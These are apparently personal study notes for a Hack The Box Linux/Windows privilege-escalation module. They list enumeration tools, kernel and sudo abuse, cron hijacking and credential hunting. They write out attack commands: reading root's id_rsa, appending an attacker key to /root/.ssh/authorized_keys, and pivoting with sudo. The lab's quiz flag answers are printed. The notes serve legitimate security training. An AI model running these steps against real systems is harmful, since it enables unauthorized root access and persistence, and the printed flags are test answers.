Finding an internal/local vulnerability that would escalate our privileges to the `root` user on `Linux` or the `administrator`/`SYSTEM` user on `Windows`.


## Checklists
### [[HackTricks]]
#tool 
https://book.hacktricks.xyz/
checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation

### PayloadsAllTheThings
#tool
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
another one

## Enumeration Scripts
Common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

==! Manual enumeration is still better because scipts such as these make a lot of "noise"==

Example of running the Linux script from `PEASS` called `LinPEAS`:

```pug
./linpeas.sh
```
```shell-session
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

## Kernel Exploits
For old operating system

Version -> [[searchsploit]] -> CVE -> try to exploit

## Vulnerable Software
public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities

## User Privileges
check what `sudo` privileges we have:
```pug
sudo -l
```

[GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`

[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

## Scheduled Tasks
1. Add new scheduled tasks/[[cron jobs]]
2. Trick them to execute a malicious software
In:
1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

## Exposed Credentials
```shell-session
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```
Again with enumerating script we can find logs such as these

## [[SSH Keys]]

1. can read `.ssh` directory (for `id_rsa`) -> 
```pug
ssh user@10.10.10.10 -i id_rsa
```
-> we can use the `-i` for copying the rsa creds. to shh command
Could have to change permissions locally (ssh server could prevent them from working).
```pug
chmod 600 id_rsa
```

2. can read `.ssh` directory (for insterting`authorized_keys`) ->
```pug
ssh-keygen -f key
```
This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine.
```pug
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
```pug
ssh root@10.10.10.10 -i key
```




# End Quiz

 SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.

```pug
sudo -l

sudo -u user2 /bin/bash
...
sudo cat flag.txt
```
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}


Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
```pug
cd /root/.shh
cat id_rsa

chmod 600 Deskotp/rsakey1
ssh root@94.237.57.59 -p 57632 -i Desktop/rsakey1
cat flag.txt
```
HTB{pr1v1l363_35c4l4710n_2_r007}